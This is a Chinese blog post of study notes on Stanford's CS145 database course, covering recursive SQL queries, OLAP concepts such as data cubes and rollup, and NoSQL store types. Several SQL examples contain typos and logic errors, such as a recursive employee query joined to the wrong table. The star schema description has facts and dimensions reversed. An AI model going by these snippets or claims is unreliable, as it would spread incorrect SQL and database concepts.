        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好耶！终于刷完了。看到进阶课程CS245还挺有意思的，就是找不到公开课，啥时候再去啃啃pdf。</p><p>本文是作者学习<strong>standford CS145 Introduction to Databases</strong>系列视频的第五篇笔记辣，估计是最后一篇，主要包括了第十五章到第十七章的内容：</p><ol><li>递归查询</li><li>OLAP</li><li>NoSQL</li></ol><p>相关参考资料：</p><p>OLTP和OLAP的区别：<a href="https://www.zhihu.com/question/305820203">OLAP和OLTP的区别是什么？ - 知乎 (zhihu.com)</a></p><p>With Cude 和 With Rollup：<a href="https://www.jianshu.com/p/343a684fc7a2">Hive中with cube、with rollup、grouping sets用法 - 简书 (jianshu.com)</a></p><p>NoSQL数据库的代表：<a href="https://zhuanlan.zhihu.com/p/418281466">一文打尽，主流 NoSQL 及应用场景详解～ - 知乎 (zhihu.com)</a></p><hr><h1 id="一、递归查询"><a href="#一、递归查询" class="headerlink" title="一、递归查询"></a>一、递归查询</h1><h2 id="1-基本介绍"><a href="#1-基本介绍" class="headerlink" title="1. 基本介绍"></a>1. 基本介绍</h2><h3 id="1-1-WITH-AS语句"><a href="#1-1-WITH-AS语句" class="headerlink" title="1.1 WITH AS语句"></a>1.1 WITH AS语句</h3><p>利用<strong>WITH AS</strong>语句<strong>为查询语句指定一个标识符</strong>，方便其他查询去调用<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">With</span> RI <span class="keyword">As</span> (query_1)</span><br><span class="line">     R2 <span class="keyword">As</span> (query_2)</span><br><span class="line">     Rn <span class="keyword">As</span> (query_n)</span><br><span class="line"><span class="operator">&lt;</span>query involving Rl, ..., Rn (<span class="keyword">and</span> other tables)<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></p><p>指定为<strong>RECURSIVE</strong>表示允许语句自身递归调用以及语句之间相互递归<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">With</span> <span class="keyword">Recursive</span></span><br><span class="line">     RI <span class="keyword">As</span> (query_1)</span><br><span class="line">     R2 <span class="keyword">As</span> (query_2)</span><br><span class="line">     Rn <span class="keyword">As</span> (query_n)</span><br><span class="line"><span class="operator">&lt;</span>query involving Rl, ..., Rn (<span class="keyword">and</span> other tables)<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></p><p>一般来说，使用RECURSIVE时，查询语句应该满足以下形式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">With</span> <span class="keyword">Recursive</span></span><br><span class="line">     R <span class="keyword">As</span> (base query</span><br><span class="line">             <span class="keyword">Union</span> </span><br><span class="line">             <span class="keyword">recursive</span> query)</span><br><span class="line"><span class="operator">&lt;</span>query involving R (<span class="keyword">and</span> other tables)<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><br>在这里使用Union而不是Union All是为了避免不断加入重复值，使递归得以终止</p><h3 id="1-2-线性递归-Linear-Recursion"><a href="#1-2-线性递归-Linear-Recursion" class="headerlink" title="1.2 线性递归(Linear Recursion)"></a>1.2 线性递归(Linear Recursion)</h3><p>在recursive query中<strong>只递归调用自身一次</strong>的，叫做<strong>线性递归</strong></p><p>常用于表中每个元组指定了直接的上下级关系，要求找到所有的无论直接或间接的上下级关系</p><p>示例如下：</p><p>(1) 已有表ParentOf(parent, child)，给定一个名字，找到他所有的祖先<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="keyword">recursive</span> </span><br><span class="line">    Ancestor(a,d) <span class="keyword">as</span> (<span class="keyword">select</span> parent <span class="keyword">as</span> a, child <span class="keyword">as</span> d <span class="keyword">from</span> ParentOf</span><br><span class="line">                      <span class="keyword">union</span></span><br><span class="line">                      <span class="keyword">select</span> Ancestor.a, Parentof.child <span class="keyword">as</span> d </span><br><span class="line">                      <span class="keyword">from</span> Ancestor, ParentOf</span><br><span class="line">                      <span class="keyword">where</span> Ancestor.d <span class="operator">=</span> Parentof.parent)</span><br><span class="line"><span class="keyword">select</span> a <span class="keyword">from</span> Ancestor <span class="keyword">where</span> d <span class="operator">=</span> <span class="string">&#x27;Mary&#x27;</span></span><br></pre></td></tr></table></figure></p><p>(2) 已有表<br>Project(name, mgrID) 包含项目的名字及其项目负责人(警觉)<br>Manager(mID, eID) 表示上下级关系，mID为上级的ID，eID为下级的ID<br>Emplyee(ID, salary) 表示员工的薪水<br>现求：给定一个项目的名字，求这个项目之下所有人的薪水总和<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--思路：先找到项目之下的所有人的ID，再与Employee表联合查询薪水总和</span></span><br><span class="line"><span class="keyword">with</span> <span class="keyword">recursive</span> </span><br><span class="line">    ProjectEmps <span class="keyword">as</span> ( <span class="keyword">select</span> mgrID <span class="keyword">as</span> ID <span class="keyword">from</span> Project <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;ProjectName&#x27;</span></span><br><span class="line">                     <span class="keyword">union</span></span><br><span class="line">                     <span class="keyword">select</span> <span class="keyword">distinct</span> eID <span class="keyword">as</span> ID </span><br><span class="line">                     <span class="keyword">from</span> Manager M, Project P</span><br><span class="line">                     <span class="keyword">where</span> M.mID <span class="operator">=</span> P.eID )</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(salary)</span><br><span class="line"><span class="keyword">from</span> ProjectEmps </span><br><span class="line"><span class="keyword">where</span> ID <span class="keyword">in</span> (<span class="keyword">select</span> ID <span class="keyword">from</span> ProjectEmps)</span><br></pre></td></tr></table></figure></p><p>(3) 已有表<br>Flight(orig, dest, cost) 表示从地点orig直达地点dest的航班需要的消费cost<br>现求：给定出发地和目的地，求从出发地到目的地的最小消费<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--思路：先找到所有直接或间接的路径及其消费，再根据出发地和目的地聚合查询</span></span><br><span class="line"><span class="keyword">with</span> <span class="keyword">recursive</span> </span><br><span class="line">    Route(orig, dest, total) <span class="keyword">as</span> </span><br><span class="line">               ( <span class="keyword">select</span> orig, dest, cost <span class="keyword">as</span> total <span class="keyword">from</span> Flight</span><br><span class="line">                 <span class="keyword">union</span></span><br><span class="line">                 <span class="keyword">select</span> R.orig, F.dest, (cost <span class="operator">+</span> total) <span class="keyword">as</span> total </span><br><span class="line">                 fromn Route R, Flight F</span><br><span class="line">                 <span class="keyword">where</span> R.dest <span class="operator">=</span> F.orig )</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(total) <span class="keyword">from</span> Route</span><br><span class="line"><span class="keyword">where</span> orig <span class="operator">=</span> <span class="string">&#x27;origName&#x27;</span> <span class="keyword">and</span> dest <span class="operator">=</span> <span class="string">&#x27;destName&#x27;</span></span><br></pre></td></tr></table></figure></p><p>但是，当航班出现环时，会引起无限递归，需要<strong>限制递归次数</strong>，有两种方案：</p><ol><li>在最后的查询语句中<strong>使用limit</strong>：直接限制得到的结果数量，缺点是不能聚合查询</li><li>在递归语句中<strong>引入计数变量</strong></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--使用limit</span></span><br><span class="line"><span class="keyword">with</span> <span class="keyword">recursive</span> </span><br><span class="line">    Route(orig, dest, total) <span class="keyword">as</span> </span><br><span class="line">               ( <span class="keyword">select</span> orig, dest, cost <span class="keyword">as</span> total <span class="keyword">from</span> Flight</span><br><span class="line">                 <span class="keyword">union</span></span><br><span class="line">                 <span class="keyword">select</span> R.orig, F.dest, (cost <span class="operator">+</span> total) <span class="keyword">as</span> total </span><br><span class="line">                 fromn Route R, Flight F</span><br><span class="line">                 <span class="keyword">where</span> R.dest <span class="operator">=</span> F.orig )</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Route  <span class="comment">--不能使用 select min(total)，因为这意味着查询期待20个最小值(没有意义)</span></span><br><span class="line"><span class="keyword">where</span> orig <span class="operator">=</span> <span class="string">&#x27;origName&#x27;</span> <span class="keyword">and</span> dest <span class="operator">=</span> <span class="string">&#x27;destName&#x27;</span> limit <span class="number">20</span>  <span class="comment">--限制结果只能有20条</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--引入计数变量，计算路径的长度并加以限制</span></span><br><span class="line"><span class="keyword">with</span> <span class="keyword">recursive</span> </span><br><span class="line">    Route(orig, dest, total, length) <span class="keyword">as</span> </span><br><span class="line">               ( <span class="keyword">select</span> orig, dest, cost, <span class="number">1</span> <span class="keyword">as</span> total <span class="keyword">from</span> Flight  <span class="comment">--直达航班路径长度为1</span></span><br><span class="line">                 <span class="keyword">union</span></span><br><span class="line">                 <span class="keyword">select</span> R.orig, F.dest, (cost <span class="operator">+</span> total) <span class="keyword">as</span> total， (R.length <span class="operator">+</span> <span class="number">1</span>) <span class="keyword">as</span> length </span><br><span class="line">                 fromn Route R, Flight F</span><br><span class="line">                 <span class="keyword">where</span> R.dest <span class="operator">=</span> F.orig <span class="keyword">and</span> R.length <span class="operator">&lt;</span> <span class="number">10</span>)  <span class="comment">--限制路径长度不能超过10</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(total) <span class="keyword">from</span> Route</span><br><span class="line"><span class="keyword">where</span> orig <span class="operator">=</span> <span class="string">&#x27;origName&#x27;</span> <span class="keyword">and</span> dest <span class="operator">=</span> <span class="string">&#x27;destName&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="2-非线性递归和互相递归"><a href="#2-非线性递归和互相递归" class="headerlink" title="2. 非线性递归和互相递归"></a>2. 非线性递归和互相递归</h2><h3 id="2-1-非线性递归-Non-linear-Recursion"><a href="#2-1-非线性递归-Non-linear-Recursion" class="headerlink" title="2.1 非线性递归(Non-linear Recursion)"></a>2.1 非线性递归(Non-linear Recursion)</h3><p>与线性递归相对地，<strong>非线性递归</strong>在递归语句中会<strong>多次引用自身</strong>。</p><p>通过以下示例，让我们思考非线性递归有什么特点：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="keyword">recursive</span> </span><br><span class="line">    Ancestor(a,d) <span class="keyword">as</span> (<span class="keyword">select</span> parent <span class="keyword">as</span> a, child <span class="keyword">as</span> d <span class="keyword">from</span> ParentOf</span><br><span class="line">                      <span class="keyword">union</span></span><br><span class="line">                      <span class="keyword">select</span> A1.a, A2.d </span><br><span class="line">                      <span class="keyword">from</span> Ancesror A1, Ancestor A2</span><br><span class="line">                      <span class="keyword">where</span> A1.d <span class="operator">=</span> A2.a)</span><br><span class="line"><span class="keyword">select</span> a <span class="keyword">from</span> Ancestor <span class="keyword">where</span> d <span class="operator">=</span> <span class="string">&#x27;Mary&#x27;</span></span><br></pre></td></tr></table></figure><br>在该示例中，我们连接两个Ancestor，而不是像前面一样用一个Ancestor连接原始的ParentOf。不难发现，这种连接方式能用<strong>更少的次数收敛到结果</strong></p><p>但是由于非线性递归较难实现，<strong>SQL标准不要求</strong>非线性递归，<strong>现有的数据库系统也未实现</strong>非线性递归</p><h3 id="2-2-互相递归-Mutual-Recursion"><a href="#2-2-互相递归-Mutual-Recursion" class="headerlink" title="2.2 互相递归(Mutual Recursion)"></a>2.2 互相递归(Mutual Recursion)</h3><p>相互递归是指<strong>多个被标识的递归语句成环地互相调用</strong></p><h4 id="1-Hub-and-Authority-示例"><a href="#1-Hub-and-Authority-示例" class="headerlink" title="(1) Hub and Authority 示例"></a>(1) Hub and Authority 示例</h4><p>现有表<br>Link(src, dest) 表示src到dest存在一条有向边</p><p>我们定义<br>被三个Hub所指的节点称作Authority<br>指向了三个Authority的节点称作Hub</p><p>初始给定两表HubStart(node)包含部分Hub, AuthStart(node)包含部分Authority<br>现求所有的Hub和Authority<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> revursive </span><br><span class="line">    Hub <span class="keyword">as</span> ( <span class="keyword">select</span> node <span class="keyword">from</span> HubStart</span><br><span class="line">             <span class="keyword">union</span></span><br><span class="line">             <span class="keyword">select</span> src <span class="keyword">as</span> node <span class="keyword">from</span> Link</span><br><span class="line">             <span class="keyword">where</span> dest <span class="keyword">in</span> (<span class="keyword">select</span> node <span class="keyword">from</span> Auth)  <span class="comment">--指向Auth</span></span><br><span class="line">             <span class="keyword">group</span> <span class="keyword">by</span> src <span class="keyword">having</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">3</span>)  <span class="comment">--按src分组，找到指向Auth大于3的src就是Hub</span></span><br><span class="line">    Auth <span class="keyword">as</span> ( <span class="keyword">select</span> node <span class="keyword">from</span> AuthStart   </span><br><span class="line">              <span class="keyword">union</span></span><br><span class="line">              <span class="keyword">select</span> dest <span class="keyword">as</span> node <span class="keyword">from</span> Link</span><br><span class="line">              <span class="keyword">where</span> src <span class="keyword">in</span> (selcet node <span class="keyword">from</span> Hub)  <span class="comment">--被Hub所指</span></span><br><span class="line">              <span class="keyword">group</span> <span class="keyword">by</span> dest <span class="keyword">having</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">3</span>  <span class="comment">--按dest分组，被超过3个Hub所指的dest就是Auth</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Hub;</span><br></pre></td></tr></table></figure></p><h4 id="2-两种不被允许的情况-在递归语句中"><a href="#2-两种不被允许的情况-在递归语句中" class="headerlink" title="(2) 两种不被允许的情况(在递归语句中)"></a>(2) 两种不被允许的情况(在递归语句中)</h4><p><strong>不允许负依赖</strong>(Negative Dependence)的子查询，示例如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> revursive </span><br><span class="line">    Hub <span class="keyword">as</span> ( <span class="keyword">select</span> node <span class="keyword">from</span> HubStart</span><br><span class="line">             <span class="keyword">union</span></span><br><span class="line">             <span class="keyword">select</span> src <span class="keyword">as</span> node <span class="keyword">from</span> Link</span><br><span class="line">             <span class="keyword">where</span> src <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> node <span class="keyword">from</span> Auth)  <span class="comment">--Hub不能同时为Hub</span></span><br><span class="line">             dest <span class="keyword">in</span> (<span class="keyword">select</span> node <span class="keyword">from</span> Auth)  </span><br><span class="line">             <span class="keyword">group</span> <span class="keyword">by</span> src <span class="keyword">having</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">3</span>)  </span><br><span class="line">    Auth <span class="keyword">as</span> ( <span class="keyword">select</span> node <span class="keyword">from</span> AuthStart   </span><br><span class="line">              <span class="keyword">union</span></span><br><span class="line">              <span class="keyword">select</span> dest <span class="keyword">as</span> node <span class="keyword">from</span> Link</span><br><span class="line">              <span class="keyword">where</span> dest <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> node <span class="keyword">from</span> Hub)  <span class="comment">--Auth不能同时为Hub</span></span><br><span class="line">              src <span class="keyword">in</span> (selcet node <span class="keyword">from</span> Hub)  </span><br><span class="line">              <span class="keyword">group</span> <span class="keyword">by</span> dest <span class="keyword">having</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">3</span>  </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Hub;</span><br></pre></td></tr></table></figure><br>当我们有一个节点同时为Hub和Authority时，它出现在哪个表中取决于我们创建Hub和Auth的顺序。<strong>SQL标准觉得这很反人类，于是不允许负依赖</strong></p><p><strong>不允许聚合查询</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="keyword">recursive</span> </span><br><span class="line">    R(x) <span class="keyword">as</span> ( <span class="keyword">select</span> x <span class="keyword">from</span> P</span><br><span class="line">           <span class="keyword">union</span></span><br><span class="line">           <span class="keyword">select</span> <span class="built_in">sum</span>(x) <span class="keyword">as</span> x <span class="keyword">from</span> R )</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> R</span><br></pre></td></tr></table></figure><br>假设P为{1, 2}<br>那么第一轮R为{1, 2, 3}<br>第二轮R为{1, 2, 6}<br>第三轮R为{1, 2, 9}…</p><p>视频的解释是：对于R没有很好的定义，于是就不被SQL标准允许了(what?</p><h3 id="2-3-小结"><a href="#2-3-小结" class="headerlink" title="2.3 小结"></a>2.3 小结</h3><p>SQL标准允许线性递归以及相互递归，未要求非线性递归。<br>不允许带负依赖的子查询，或者聚合查询的递归语句。</p><p>现有数据库系统只有实现了线性递归</p><blockquote><p>Extends expressiveness of SQL</p><ul><li>Basic functionality: linear recursion</li><li>Extended functionality: nonlinear recursion, mutual recursion</li><li>Disallowed: recursive subqueries (negative), aggregation</li></ul></blockquote><hr><h1 id="二、OLAP-Online-Analytical-Processing"><a href="#二、OLAP-Online-Analytical-Processing" class="headerlink" title="二、OLAP(Online Analytical Processing)"></a>二、OLAP(Online Analytical Processing)</h1><h2 id="1-基本介绍-1"><a href="#1-基本介绍-1" class="headerlink" title="1. 基本介绍"></a>1. 基本介绍</h2><p>这几集刷下来就像学了一堆行业黑话，其实说到底OLAP就是用来分析大规模的数据，而不是对小部分的数据做增删改查，后者是传统关系型数据库的主要应用，称为OLTP(Online Transaction Processing)。</p><p>两者的对比如下：</p><div class="table-container"><table><thead><tr><th style="text-align:center">OLAP/OLTP</th><th style="text-align:center">事务</th><th style="text-align:center">处理的数据规模</th><th style="text-align:center">查询复杂程度</th><th style="text-align:center">更新频率</th></tr></thead><tbody><tr><td style="text-align:center">OLTP</td><td style="text-align:center">短</td><td style="text-align:center">小</td><td style="text-align:center">低</td><td style="text-align:center">频繁</td></tr><tr><td style="text-align:center">OLAP</td><td style="text-align:center">长</td><td style="text-align:center">大</td><td style="text-align:center">高</td><td style="text-align:center">不频繁</td></tr></tbody></table></div><h2 id="2-星型模式-Star-Schema"><a href="#2-星型模式-Star-Schema" class="headerlink" title="2. 星型模式(Star Schema)"></a>2. 星型模式(Star Schema)</h2><p>OLTP组织数据使用的是ER模型，突出实体的特征和实体之间的连接。</p><p>OLAP组织数据的模式则是Star Schema，由一个<strong>不常更新维度表</strong>引用<strong>多个经常更新事实表</strong>组成：</p><ol><li>维度表(Dimensions Table)：属性一般为各事实表的主键(维度属性)以及其他值(依赖属性)，更新不频繁且规模较小。</li><li>事实表(Fact Table)：记录发生的事，更新频繁且规模很大，通常只允许插入</li></ol><p>一堆黑话我真的服了，我尽量讲人话吧：</p><p>维度表包含三个维度和一个值时，我们给数据建一个三维坐标系，将所有数据看作一个立方体，称作<strong>数据立方体</strong>(Data Cube)。多个维度和多个值时也可以这么去抽象。</p><p>只取坐标系上的一个面，也就是不考虑其中一个维度时，就是<strong>对特定维度做聚合操作</strong>，称作<strong>切片</strong>(Slice)，给这个维度加限制条件，即<strong>对特定维度下特定区间做聚合操作</strong>时，称作<strong>切块</strong>(Dice)</p><p>假设我们现在对两个维度分组，现在想更精确地去分析数据，所以要<strong>多对一个维度分组</strong>，称作<strong>钻取</strong>(Drill-down)。相反地，我们觉得现在太精细了，想从更高层次对数据分析，所以要<strong>少对一个维度分组</strong>，称作<strong>上卷</strong>(Roll-up)。示例如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--现在只对两个维度分组</span></span><br><span class="line"><span class="keyword">select</span> state, brand, <span class="built_in">sum</span>(qty<span class="operator">*</span>price)</span><br><span class="line"><span class="keyword">From</span> Sales F, Store S, Item I</span><br><span class="line"><span class="keyword">Where</span> F.storeID <span class="operator">=</span> S.storeID <span class="keyword">And</span> F.itemID <span class="operator">=</span> I.itemID </span><br><span class="line"><span class="keyword">Group</span> <span class="keyword">By</span> state, brand</span><br><span class="line"></span><br><span class="line"><span class="comment">--再加一个维度叫做Drill-down</span></span><br><span class="line"><span class="keyword">select</span> state, brand, category, <span class="built_in">sum</span>(qty<span class="operator">*</span>price)</span><br><span class="line"><span class="keyword">From</span> Sales F, Store S, Item I</span><br><span class="line"><span class="keyword">Where</span> F.storeID <span class="operator">=</span> S.storeID <span class="keyword">And</span> F.itemID <span class="operator">=</span> I.itemID </span><br><span class="line"><span class="keyword">Group</span> <span class="keyword">By</span> state, brand, category</span><br><span class="line"></span><br><span class="line"><span class="comment">--少一个叫做Roll-up</span></span><br><span class="line"><span class="keyword">select</span> brand, <span class="built_in">sum</span>(qty<span class="operator">*</span>price)</span><br><span class="line"><span class="keyword">From</span> Sales F, Store S, Item I</span><br><span class="line"><span class="keyword">Where</span> F.storeID <span class="operator">=</span> S.storeID <span class="keyword">And</span> F.itemID <span class="operator">=</span> I.itemID </span><br><span class="line"><span class="keyword">Group</span> <span class="keyword">By</span> brand</span><br></pre></td></tr></table></figure></p><h2 id="3-SQL中的OLAP"><a href="#3-SQL中的OLAP" class="headerlink" title="3. SQL中的OLAP"></a>3. SQL中的OLAP</h2><p>SQL标准中，在Group By之后使用With Cude 和 With Rollup以便执行OLAP查询：</p><ol><li><strong>With Cude</strong>：查询结果包含各个维度的笛卡尔组合(包括NULL)，值为NULL代表对该维度聚合</li><li><strong>With Rollup</strong>：一层一层向前Roll-up，即满足前一维度为NULL时，后一维度必定为NULL。适用于有层次结构的数据，比如统计省、市、县的人口</li></ol><p>MySQL支持With Rollup，Postgre和SQLite都不支持</p><p>然而，With Cude可以由各个维度的With Rollup 做并操作得到，示例如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--MySQL不支持with cube</span></span><br><span class="line"><span class="keyword">select</span> storeID, itemID, custID,<span class="built_in">sum</span>(price) <span class="keyword">from</span> Sales</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> storeID, itemID, custID <span class="keyword">with</span> <span class="keyword">cube</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--上式可以等价于</span></span><br><span class="line"><span class="keyword">select</span> storeID, itemID, custID,<span class="built_in">sum</span>(price) <span class="keyword">from</span> Sales</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> storeID, itemID, custID <span class="keyword">with</span> <span class="keyword">rollup</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> storeID, itemID, custID, <span class="built_in">sum</span>(price) <span class="keyword">from</span> Sales</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> itemID, custID, storeID <span class="keyword">with</span> <span class="keyword">rollup</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> storeID, itemID, custID, <span class="built_in">sum</span>(price) <span class="keyword">from</span> Sales</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> custID, storeID, itemID <span class="keyword">with</span> <span class="keyword">rollup</span>;</span><br></pre></td></tr></table></figure></p><hr><h1 id="三、NoSQL"><a href="#三、NoSQL" class="headerlink" title="三、NoSQL"></a>三、NoSQL</h1><h2 id="1-基本介绍-2"><a href="#1-基本介绍-2" class="headerlink" title="1. 基本介绍"></a>1. 基本介绍</h2><p>NoSQL中的SQL不是指SQL这种查询语言，而是<strong>相对于传统的关系型数据库</strong>。No也不是没有的意思，而是<strong>Not Only</strong></p><p>所以NoSQL就是用<strong>其他的关系模式去组织数据，使其能够解决传统关系型数据库不容易甚至不能解决的问题</strong>。通常具有以下特点：</p><ol><li>更灵活的数据组织模式</li><li>更快地、更少消耗的搭建</li><li>面向大规模的数据</li><li>牺牲部分的一致性，允许近似解，去换取更高的性能</li></ol><blockquote><p>+表示优点、-表示缺点<br>+Flexible schema<br>+Quicker/cheaper to set up<br>+Massive scalability<br>+Relaxed consistency-&gt;higher performance &amp; availability<br>-No declarative querylanguage-&gt;more programming<br>-Relaxed consistency-&gt;fewer guarantees</p></blockquote><p>常见的NoSQL数据库包括以下几个类型：</p><ol><li>MapReduce框架(MapReduce framework)</li><li>键值数据库(Key-Values stores)</li><li>文档数据库(Document stores)</li><li>图数据库(Graph database systems)</li><li>列存储数据库(Column stores)</li></ol><h2 id="2-MapReduce框架"><a href="#2-MapReduce框架" class="headerlink" title="2. MapReduce框架"></a>2. MapReduce框架</h2><p>MapReduce起源于Google，代表为Hadoop</p><p>MapReduce框架中</p><ol><li>没有数据模型，直接从文件输入再输出到文件中</li><li>由用户提供一系列函数：map(), reduce(), reader(), writer(), combiner()</li><li>由系统将这些功能粘合(glue)在一起，同时提供容错(fault tolerance)和扩展性(scalability)</li></ol><p>其中，<br>reader()从文件中读取数据，<br>writer()将结果输出到文件中，<br>map()提供将问题分解为子问题的方法，<br>reduce()求解子问题然后合并为结果，<br>combiner()为可选功能，它位于map()和reduce()之间，对子问题预合并，以提高效率。</p><p><img src="/img/2024/02/MapReduce.png" alt="image.png"></p><h2 id="3-键值数据库"><a href="#3-键值数据库" class="headerlink" title="3. 键值数据库"></a>3. 键值数据库</h2><p>键值数据库的代表有Riak、Redis、Memcached、Amazon’s Dynamo、Project Voldemort</p><p>键值数据库应用于OLTP，即小部分数据的频繁增删改查</p><ul><li>数据模型：(key, values) pairs 即键值对</li><li>操作：<ul><li>Insert(key, values) ：插入键值对</li><li>Fetch(key)：根据键查询值</li><li>Update(key)：根据键更新值</li><li>Delete(key)：根据键删除键值对</li></ul></li><li>有些数据库允许value中有更复杂的结构</li><li>有些数据库允许在一定范围的查询</li></ul><h2 id="4-文档数据库"><a href="#4-文档数据库" class="headerlink" title="4. 文档数据库"></a>4. 文档数据库</h2><p>文档数据库的代表有MongoDB、CouchDB、RavenDB</p><p>文档数据库的数据模型和操作跟键值数据库很像，只不过存储的文档有特定的类型</p><ul><li>数据模型：(key, document) pairs</li><li>文档类型：JSON、XML等</li><li>操作：<ul><li>Insert(key, document) ：插入键和文档的对</li><li>Fetch(key)：根据键查询文档</li><li>Update(key)：根据键更新文档</li><li>Delete(key)：根据键删除文档</li></ul></li><li>可以根据文档类型做查询</li></ul><h2 id="5-图数据库"><a href="#5-图数据库" class="headerlink" title="5. 图数据库"></a>5. 图数据库</h2><p>图数据库的代表有Neo4J、Infinite Graph、OrientDB</p><p>不同的图数据库之间实现差别很大</p><ul><li>数据模型：点集 和 边集</li><li>节点包含有属性（包括节点的ID）</li><li>边包含标签（表示节点之间的关系）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> SQL </tag>
            
            <tag> OLAP </tag>
            
            <tag> NoSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
